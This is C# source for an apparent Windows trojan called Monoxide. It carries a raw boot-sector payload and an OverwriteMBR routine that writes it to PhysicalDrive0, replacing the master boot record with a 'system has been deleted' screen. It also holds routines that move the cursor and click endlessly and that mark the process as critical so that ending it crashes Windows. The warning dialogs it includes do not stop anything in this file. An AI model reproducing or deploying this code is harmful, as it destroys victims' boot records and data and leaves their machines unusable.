﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Runtime.ConstrainedExecution;
using System.Security;
using System.Threading;
using System.Runtime;
using System.Drawing;
using static Monoxide.Import;
using System.Windows.Forms;

namespace Monoxide
{
	public static class destruction
    {
		private static byte[] code1 = {
	0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0, 0x66, 0xBC, 0x00, 0x7C,
	0x00, 0x00, 0x66, 0x89, 0xE5, 0xEA, 0x1A, 0x7C, 0x00, 0x00, 0x30, 0xE4, 0xB0, 0x13, 0xCD, 0x10,
	0x0F, 0x31, 0xA3, 0xA9, 0x7C, 0xE8, 0x24, 0x00, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBF, 0xFF, 0xF9,
	0xB1, 0x20, 0xEB, 0x44, 0x89, 0xD8, 0xC1, 0xE0, 0x07, 0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE8, 0x09,
	0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE0, 0x08, 0x31, 0xC3, 0x89, 0xD8, 0xC3, 0xB4, 0x02, 0x30, 0xFF,
	0x30, 0xD2, 0xCD, 0x10, 0xBE, 0xAB, 0x7C, 0xAC, 0x08, 0xC0, 0x74, 0x15, 0x50, 0x8B, 0x1E, 0xA9,
	0x7C, 0xE8, 0xD0, 0xFF, 0x31, 0x06, 0xA9, 0x7C, 0x88, 0xC3, 0x58, 0xB4, 0x0E, 0xCD, 0x10, 0xEB,
	0xE6, 0xFE, 0xC6, 0x74, 0x02, 0xEB, 0xD5, 0xC3, 0x8B, 0x1E, 0xA9, 0x7C, 0xE8, 0xB5, 0xFF, 0x31,
	0x06, 0xA9, 0x7C, 0x31, 0xD2, 0xBB, 0x03, 0x00, 0xF7, 0xF3, 0x89, 0xD0, 0x00, 0xC8, 0x26, 0x88,
	0x05, 0x4F, 0x83, 0xFF, 0xFF, 0x75, 0xE1, 0xBF, 0xFF, 0xF9, 0x80, 0xF9, 0x33, 0x7F, 0x04, 0xFE,
	0xC1, 0xEB, 0xD5, 0xFE, 0xC5, 0xB1, 0x20, 0xEB, 0xCF, 0x00, 0x10, 0x54, 0x68, 0x69, 0x73, 0x20,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20,
	0x64, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x4D, 0x6F, 0x6E, 0x6F, 0x78,
	0x69, 0x64, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
		public static void OverwriteMBR()
        {
			IntPtr hDrive;
			uint dwWrittenBytes;
			bool bSuccess;

			hDrive = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);

			if (hDrive == INVALID_HANDLE_VALUE)
			{
				MessageBox.Show("I failed to infect your computer and I am a failure.\n...\nI hope you don't mind.\n(God, this is so embarrassing...)", "Monoxide.exe", MessageBoxButtons.OK,MessageBoxIcon.Error);
			}

			bSuccess = WriteFile(hDrive, code1, 512, out dwWrittenBytes, IntPtr.Zero);

			if (!bSuccess)
			{
				CloseHandle(hDrive);
			}
		}
		public static void CursorMovement()
        {
			for (; ; )
			{
				Random r = new Random();
				int w = Screen.PrimaryScreen.Bounds.Width;
				int h = Screen.PrimaryScreen.Bounds.Height;
				Thread.Sleep(10);
					Cursor.Position = new System.Drawing.Point(r.Next(0, w), r.Next(0, h));
				}
			}
		public static void Clicker()
		{
			for (; ; )
			{
				Thread.Sleep(10);
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			}
		}
		public static void WARNING()
		{
			if (MessageBox.Show("WARNING!\n\nYou have ran a Trojan known as Monoxide.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", "Malware alert - Monoxide.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
			{
				if (MessageBox.Show("FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", "Malware alert - Monoxide.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
					return;
                }
			}
		}
		
		public static bool SetCriticalProcess()
		{
			bool bUnused;
			RtlAdjustPrivilege(20 /* SeDebugPrivilege */, true, false, out bUnused);
				RtlSetProcessIsCritical(true, IntPtr.Zero, false);
			return true;
		}
	}
}